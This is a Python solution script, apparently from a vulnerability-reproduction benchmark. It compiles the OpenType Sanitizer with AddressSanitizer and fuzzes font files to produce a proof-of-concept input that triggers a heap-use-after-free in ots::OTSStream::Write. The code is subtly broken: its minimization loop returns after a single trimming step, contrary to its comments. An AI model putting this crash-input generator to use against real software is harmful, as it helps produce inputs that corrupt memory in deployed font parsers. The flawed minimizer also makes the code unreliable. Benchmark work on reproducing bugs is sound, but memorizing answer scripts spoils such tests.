import os
import sys
import tarfile
import subprocess
import tempfile
import shutil
import random
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap-use-after-free vulnerability in ots::OTSStream::Write.
        This solution extracts the source, compiles it with AddressSanitizer, and fuzzes it
        using available font files as seeds.
        """
        # Create a temporary workspace
        work_dir = tempfile.mkdtemp()
        try:
            # Extract the source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            # Locate the source root (handle potential single top-level directory)
            src_root = work_dir
            entries = os.listdir(work_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
                src_root = os.path.join(work_dir, entries[0])
            
            # Setup compiler flags for ASAN
            env = os.environ.copy()
            # -O1 for speed with meaningful stack traces, disable leak detection to focus on UAF
            san_flags = "-fsanitize=address -g -O1"
            env["CC"] = "clang"
            env["CXX"] = "clang++"
            env["CFLAGS"] = san_flags
            env["CXXFLAGS"] = san_flags
            env["LDFLAGS"] = "-fsanitize=address"
            env["ASAN_OPTIONS"] = "detect_leaks=0:halt_on_error=1"
            
            executable = None
            build_success = False
            
            # 1. Attempt Build via Meson
            has_meson_build = os.path.exists(os.path.join(src_root, "meson.build"))
            meson_bin = shutil.which("meson")
            
            if has_meson_build and meson_bin:
                build_dir = os.path.join(src_root, "build_asan")
                try:
                    subprocess.run([meson_bin, "setup", build_dir], cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["ninja", "-C", build_dir], cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    cand = os.path.join(build_dir, "ots-sanitize")
                    if os.path.exists(cand):
                        executable = cand
                        build_success = True
                except subprocess.CalledProcessError:
                    pass
            
            # 2. Attempt Build via Autotools
            if not build_success:
                has_autogen = os.path.exists(os.path.join(src_root, "autogen.sh"))
                has_configure = os.path.exists(os.path.join(src_root, "configure"))
                
                if has_autogen or has_configure:
                    try:
                        if has_autogen:
                            subprocess.run(["sh", "./autogen.sh"], cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                        if not os.path.exists(os.path.join(src_root, "configure")):
                            # Fallback if autogen failed to create configure
                            pass
                        else:
                            subprocess.run(["./configure"], cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            subprocess.run(["make", "-j8"], cwd=src_root, env=env, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            cand = os.path.join(src_root, "ots-sanitize")
                            if os.path.exists(cand):
                                executable = cand
                                build_success = True
                    except subprocess.CalledProcessError:
                        pass

            # 3. Fallback search for binary
            if not executable:
                for root, dirs, files in os.walk(src_root):
                    if "ots-sanitize" in files:
                        cand = os.path.join(root, "ots-sanitize")
                        if os.access(cand, os.X_OK):
                            executable = cand
                            break
            
            if not executable:
                return b''

            # Gather Seeds from the source tree (tests/fonts)
            seeds = []
            for root, dirs, files in os.walk(src_root):
                for f in files:
                    if f.lower().endswith(('.ttf', '.otf', '.woff', '.woff2')):
                        try:
                            path = os.path.join(root, f)
                            # Filter out very large files to optimize fuzzing speed
                            if os.path.getsize(path) < 50 * 1024: 
                                with open(path, "rb") as fd:
                                    seeds.append(fd.read())
                        except:
                            continue
            
            if not seeds:
                # Minimal seed if none found
                seeds.append(b'\x00\x01\x00\x00\x00\x00\x00\x00')

            # Fuzz Loop
            # Time limit ensures we return within a reasonable window
            start_time = time.time()
            time_limit = 180 # 3 minutes
            
            best_poc = None
            found_specific = False
            
            while time.time() - start_time < time_limit:
                seed = random.choice(seeds)
                
                # Mutation Strategy
                mutated = bytearray(seed)
                if not mutated: continue
                
                mutation_ops = random.randint(1, max(2, len(mutated) // 50))
                for _ in range(mutation_ops):
                    op = random.randint(0, 3)
                    idx = random.randint(0, len(mutated) - 1)
                    
                    if op == 0: # Bit flip
                        mutated[idx] ^= (1 << random.randint(0, 7))
                    elif op == 1: # Byte flip
                        mutated[idx] = random.randint(0, 255)
                    elif op == 2: # Delete
                        chunk = random.randint(1, 100)
                        if idx + chunk <= len(mutated):
                            del mutated[idx:idx+chunk]
                    elif op == 3: # Insert junk
                        chunk = random.randint(1, 10)
                        junk = os.urandom(chunk)
                        mutated[idx:idx] = junk

                # Write to tmp file
                with tempfile.NamedTemporaryFile(delete=False) as tf:
                    tf.write(mutated)
                    tf_path = tf.name
                
                try:
                    # Run target
                    res = subprocess.run([executable, tf_path], capture_output=True, timeout=1)
                    stderr = res.stderr.decode(errors='ignore')
                    
                    if "AddressSanitizer: heap-use-after-free" in stderr:
                        # Check if it matches the specific requirement
                        if "ots::OTSStream::Write" in stderr:
                            best_poc = bytes(mutated)
                            found_specific = True
                            break # Success
                        elif best_poc is None:
                            # Save as backup if we haven't found the specific one yet
                            best_poc = bytes(mutated)
                except subprocess.TimeoutExpired:
                    pass
                except Exception:
                    pass
                finally:
                    if os.path.exists(tf_path):
                        os.remove(tf_path)
            
            # Minimization Phase
            if best_poc:
                current_poc = best_poc
                # Attempt to strip from end to reduce size (improves score)
                # Try aggressive cutting first
                step_div = 10
                for _ in range(15):
                    if len(current_poc) < 800: break # Already close to ground truth
                    
                    cut_len = len(current_poc) // step_div
                    if cut_len == 0: cut_len = 1
                    
                    candidate = current_poc[:-cut_len]
                    
                    with tempfile.NamedTemporaryFile(delete=False) as tf:
                        tf.write(candidate)
                        tf_path = tf.name
                    
                    valid_min = False
                    try:
                        res = subprocess.run([executable, tf_path], capture_output=True, timeout=1)
                        stderr = res.stderr.decode(errors='ignore')
                        
                        target_str = "ots::OTSStream::Write" if found_specific else "AddressSanitizer: heap-use-after-free"
                        if "AddressSanitizer: heap-use-after-free" in stderr and target_str in stderr:
                            current_poc = candidate
                            valid_min = True
                    except:
                        pass
                    finally:
                        if os.path.exists(tf_path):
                            os.remove(tf_path)
                    
                    if not valid_min:
                        # If cutting failed, decrease step size (make cuts smaller)
                        step_div += 5
                    
                return current_poc

            return b''

        except Exception:
            return b''
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
